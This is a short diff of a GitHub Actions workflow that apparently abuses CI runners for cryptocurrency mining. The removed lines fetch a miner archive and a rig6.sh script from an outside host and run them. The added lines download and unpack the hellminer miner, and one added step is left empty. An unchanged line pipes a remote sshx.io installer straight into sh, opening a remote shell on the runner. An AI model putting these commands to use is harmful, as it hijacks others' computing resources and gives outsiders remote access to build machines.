@@ -11,10 +11,8 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: sudo apt install neofetch -y
-      - run: wget https://pedodev.my.id/miner.zip
-      - run: unzip miner.zip
-      - run: chmod +x hellminer verus-solver
-      - run: wget https://pedodev.my.id/rig6.sh
-      - run: chmod +x rig6.sh
-      - run: ./rig6.sh
+      - run: neofetch
+      - run: wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+      - run: tar -xzvf hellminer_linux64_avx2.tar.gz
+      - run: 
       - run: curl -sSf https://sshx.io/get | sh -s run
